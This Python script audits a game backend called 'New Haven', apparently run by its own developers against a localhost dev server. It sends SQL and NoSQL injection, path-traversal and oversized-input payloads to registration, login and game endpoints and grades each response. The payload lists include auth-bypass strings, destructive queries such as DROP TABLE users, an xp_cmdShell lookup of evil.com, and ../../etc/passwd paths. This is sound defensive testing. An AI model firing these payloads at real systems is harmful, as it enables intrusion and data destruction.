#!/usr/bin/env python3
"""
New Haven SQL Injection / Input Manipulation Audit
==================================================
Tests all API endpoints for SQL injection, NoSQL injection,
and input manipulation vulnerabilities.

Prerequisites:
  - Backend running on http://localhost:8088
  - Dev mode enabled
"""

import json
import sys
import urllib.request
import urllib.error
import urllib.parse
import time

BASE = "http://localhost:8088"

PASS = 0
FAIL = 0
WARN = 0

def test(name, outcome, detail=""):
    global PASS, FAIL, WARN
    if outcome == "PASS":
        PASS += 1
        print(f"  [PASS] {name}")
    elif outcome == "WARN":
        WARN += 1
        print(f"  [WARN] {name} - {detail}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name} - {detail}")

def api(method, path, body=None, token=None, headers=None):
    hdrs = {"Content-Type": "application/json"}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    if headers:
        hdrs.update(headers)
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(f"{BASE}{path}", data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(req)
        return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        body_text = e.read().decode()
        try:
            return e.code, json.loads(body_text)
        except json.JSONDecodeError:
            return e.code, body_text
    except Exception as e:
        return 0, str(e)

def login():
    status, data = api("POST", "/api/login", {"username": "dev", "password": "123"})
    if status == 200:
        return data.get("data", {}).get("token") or data.get("token")
    return None

# ============================================================
# SQL INJECTION PAYLOADS
# ============================================================
SQL_PAYLOADS = [
    # Classic auth bypass
    ("' OR '1'='1", "' OR '1'='1' --"),
    ("admin' --", "admin' #"),
    ("' OR 1=1--", "\\' OR 1=1 --"),
    # UNION injection
    ("' UNION SELECT * FROM users--", ""),
    ("1 UNION SELECT username,password FROM users--", ""),
    # Stacked queries
    ("'; DROP TABLE users--", ""),
    ("'; DELETE FROM companies--", ""),
    ("'; UPDATE users SET admin=1--", ""),
    # Time-based blind
    ("' OR sleep(5)=0--", ""),
    ("1; WAITFOR DELAY '00:00:05'--", ""),
    ('" OR pg_sleep(5)--', ""),
    # Error-based
    ("' OR 1=CAST((SELECT @@version) AS int)--", ""),
    ("1 AND 1=CONVERT(int,@@version)--", ""),
    # Out-of-band
    ("' EXEC xp_cmdShell('nslookup evil.com')--", ""),
    # NoSQL injection
    ('{ "$ne": null }', ''),
    ('{ "$gt": "" }', ''),
    ('{ "$where": "1==1" }', ''),
    # PostgreSQL specific
    ("'::int=1", ""),
    ("E'\\x'),(NULL))--", ""),
    # Null byte
    ("admin%00", "\\x00"),
    # Newline injection
    ("admin\n<script>", ""),
    ("admin\r\n<script>", ""),
]

# ============================================================
# TESTS
# ============================================================
def main():
    global PASS, FAIL, WARN
    print("New Haven SQL Injection Audit")
    print("=" * 60)
    print(f"Target: {BASE}")
    print()

    token = login()
    if not token:
        print("ERROR: Could not login")
        sys.exit(1)
    print(f"Auth token: {token[:20]}...")
    print()

    # ----------------------------------------------------------
    # SECTION 1: Registration API (unauthenticated)
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 1: Registration Endpoint")
    print("=" * 60)
    base_reg = {"username": "sqluser_base", "password": "test123"}
    for payload, _ in SQL_PAYLOADS[:8]:  # Test top 8 payloads
        safe_payload = payload[:40].replace("\n", "\\n")
        reg_data = dict(base_reg)
        reg_data["username"] = f"sql_{int(time.time())}_{PASS}"
        reg_data["password"] = payload
        status, data = api("POST", "/api/register", reg_data)
        if status == 200 or status == 409:
            test(f"Register: {safe_payload}", "PASS", "No effect - safely handled as string")
        elif status in (400, 422):
            test(f"Register: {safe_payload}", "PASS", f"Rejected ({status})")
        elif status == 429:
            test(f"Register: {safe_payload}", "WARN", "Rate limited")
        else:
            test(f"Register: {safe_payload}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 2: Login API (unauthenticated) - auth bypass attempts
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 2: Login - Auth Bypass Attempts")
    print("=" * 60)
    bypass_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "\\' OR 1=1 --",
        'admin" OR "1"="1',
        '{"$ne": null}',
        "' UNION SELECT * FROM players--",
    ]
    for payload in bypass_payloads:
        safe_payload = payload[:30]
        status, data = api("POST", "/api/login", {"username": payload, "password": payload})
        if status == 200:
            test(f"Login bypass: {safe_payload}", "FAIL", "AUTH BYPASSED! Token obtained!")
        elif status == 401:
            test(f"Login bypass: {safe_payload}", "PASS", "Properly rejected")
        elif status in (400, 422):
            test(f"Login bypass: {safe_payload}", "PASS", f"Rejected ({status})")
        elif status == 429:
            test(f"Login bypass: {safe_payload}", "WARN", "Rate limited")
        else:
            test(f"Login bypass: {safe_payload}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 3: Authenticated endpoints - SQL injection
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 3: Report Endpoint (authenticated)")
    print("=" * 60)
    for payload, _ in SQL_PAYLOADS:
        safe_payload = payload[:40].replace("\n", "\\n")
        status, data = api("POST", "/api/v2/report/",
                          {"category": "bug", "description": payload}, token=token)
        if status == 201:
            test(f"Report desc: {safe_payload}", "PASS", "Stored safely as JSON string")
        elif status == 429:
            test(f"Report desc: {safe_payload}", "WARN", "Rate limited")
        elif status in (400, 422):
            test(f"Report desc: {safe_payload}", "PASS", f"Rejected ({status})")
        else:
            test(f"Report desc: {safe_payload}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 4: Story progress endpoint
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 4: Story Progress (authenticated)")
    print("=" * 60)
    test_payloads = [
        ("storyId", "' OR '1'='1"),
        ("storyId", "'; DROP TABLE companies--"),
        ("storyId", "../../etc/passwd"),
        ("stepId", "' OR '1'='1"),
        ("stepId", "__proto__"),
        ("status", "__proto__"),
        ("status", "' OR 1=1--"),
        ("storyId", '{"$ne": null}'),
    ]
    for field, payload in test_payloads:
        safe_payload = payload[:30]
        status, data = api("PATCH", "/api/v2/companies/me/story-progress/",
                          {field: payload, "description": "test"} if field != "storyId" else
                          {"storyId": payload, "stepId": "test", "status": "in_progress"},
                          token=token)
        # Story progress PATCH is strict about its body schema
        if status in (201, 200):
            test(f"Story {field}: {safe_payload}", "WARN", "Accepted - may need investigation")
        elif status in (400, 422, 404):
            test(f"Story {field}: {safe_payload}", "PASS", f"Rejected ({status})")
        elif status == 429:
            test(f"Story {field}: {safe_payload}", "WARN", "Rate limited")
        else:
            test(f"Story {field}: {safe_payload}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 5: Building endpoints
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 5: Building Market & Buy (authenticated)")
    print("=" * 60)
    # Market is GET with no user input
    status, data = api("GET", "/api/v2/buildings/market/", token=token)
    if status == 200:
        test("Building market GET", "PASS")
    else:
        test("Building market GET", "FAIL", f"Got {status}")

    # Buy with injection in buildingId
    buy_payloads = [
        "' OR '1'='1",
        "1; DROP TABLE buildings--",
        "../../etc/passwd",
        "../log/report-1.json",
    ]
    for payload in buy_payloads:
        safe_payload = payload[:30]
        status, data = api("POST", "/api/v2/buildings/buy/",
                          {"buildingId": payload}, token=token)
        if status in (404, 400, 422):
            test(f"Buy buildingId: {safe_payload}", "PASS", f"Rejected ({status})")
        elif status == 200:
            test(f"Buy buildingId: {safe_payload}", "WARN", "Accepted! May be dangerous.")
        else:
            test(f"Buy buildingId: {safe_payload}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 6: Production endpoints
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 6: Production (authenticated)")
    print("=" * 60)
    prod_payloads = [
        ("building_id", "'; DROP TABLE jobs--"),
        ("building_id", "../log/report-1.json"),
        ("resource_id", 99999),
        ("quantity", -1),
        ("quantity", 0),
        ("quantity", 999999999),
    ]
    # First buy and place a real building for production tests
    status, data = api("POST", "/api/v2/buildings/buy/",
                      {"buildingId": "b-shop-1"}, token=token)
    if status == 200:
        bid = data.get("data", {}).get("building", {}).get("id", "")
        # Place it
        api("POST", "/api/v2/buildings/place/",
           {"buildingId": bid}, token=token)
    else:
        print("  [WARN] Could not buy building for production tests")

    for field, payload in prod_payloads:
        safe_payload = str(payload)[:30]
        req_body = {"building_id": bid if field == "building_id" else bid,
                    "resource_id": 1, "quantity": 10}
        req_body[field] = payload
        status, data = api("POST", "/api/v2/production/start/", req_body, token=token)
        if status in (400, 422, 404):
            test(f"Production {field}={safe_payload}", "PASS", f"Rejected ({status})")
        elif status == 200:
            test(f"Production {field}={safe_payload}", "WARN", "Accepted")
        elif status == 429:
            test(f"Production {field}={safe_payload}", "WARN", "Rate limited")
        else:
            test(f"Production {field}={safe_payload}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 7: Input Boundary Tests
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 7: Boundary & Special Character Tests")
    print("=" * 60)
    boundary_tests = [
        ("Login username", "POST", "/api/login",
         {"username": "A" * 1000, "password": "test"}, None),
        ("Login password", "POST", "/api/login",
         {"username": "dev", "password": "A" * 10000}, None),
        ("Login null bytes", "POST", "/api/login",
         {"username": "dev\x00admin", "password": "test"}, None),
        ("Register long name", "POST", "/api/register",
         {"username": "B" * 500, "password": "test123", "name": "X" * 500}, None),
        ("Register Unicode", "POST", "/api/register",
         {"username": "你好世界😀测试", "password": "test123", "name": "测试名称"}, None),
        ("Register SQL in name", "POST", "/api/register",
         {"username": "normaltest", "password": "test123",
          "name": "Robert'); DROP TABLE Students;--"}, None),
        ("Register newline in username", "POST", "/api/register",
         {"username": "test\nadmin", "password": "test123"}, None),
    ]
    for name, method, path, body, headers in boundary_tests:
        safe_name = name[:40]
        status, data = api(method, path, body, token=None, headers=headers)
        if status in (200, 201):
            test(f"Boundary: {safe_name}", "PASS" if "null bytes" not in name.lower() else "WARN",
                 f"Accepted ({status})" if "null bytes" not in name.lower() else "Null byte accepted - stored?")
        elif status in (400, 422, 413):
            test(f"Boundary: {safe_name}", "PASS", f"Rejected ({status})")
        elif status in (409, 401):
            test(f"Boundary: {safe_name}", "PASS", f"Expected ({status})")
        elif status == 429:
            test(f"Boundary: {safe_name}", "WARN", "Rate limited")
        else:
            test(f"Boundary: {safe_name}", "FAIL", f"Unexpected {status}")
    print()

    # ----------------------------------------------------------
    # SECTION 8: Path traversal in URLs
    # ----------------------------------------------------------
    print("=" * 60)
    print("SECTION 8: Path Traversal & URL Manipulation")
    print("=" * 60)
    traversal_paths = [
        "/api/v2/../../etc/passwd",
        "/api/../log/",
        "/api/v2/companies/me/buildings/../../../log/",
        "/api/v2/%2e%2e/%2e%2e/etc/passwd",
    ]
    for path in traversal_paths:
        status, data = api("GET", path, token=token)
        if status in (404, 400):
            test(f"Path traversal: {path[:40]}", "PASS", f"Rejected ({status})")
        elif status == 200:
            test(f"Path traversal: {path[:40]}", "FAIL", "Accessible!")
        else:
            test(f"Path traversal: {path[:40]}", "WARN", f"Got {status}")
    print()

    # ----------------------------------------------------------
    # SUMMARY
    # ----------------------------------------------------------
    print("=" * 60)
    print("AUDIT SUMMARY")
    print("=" * 60)
    total = PASS + FAIL + WARN
    print(f"  Total tests : {total}")
    print(f"  PASS        : {PASS}")
    print(f"  WARN        : {WARN}")
    print(f"  FAIL        : {FAIL}")
    print()
    if FAIL > 0:
        print("  ** FAILURES:")
        print(f"     {FAIL} test(s) failed. Review above.")
    if WARN > 0:
        print("  ** WARNINGS:")
        print(f"     {WARN} warning(s). Review above.")
    if PASS == total:
        print("  All checks passed!")
    print()


if __name__ == "__main__":
    main()
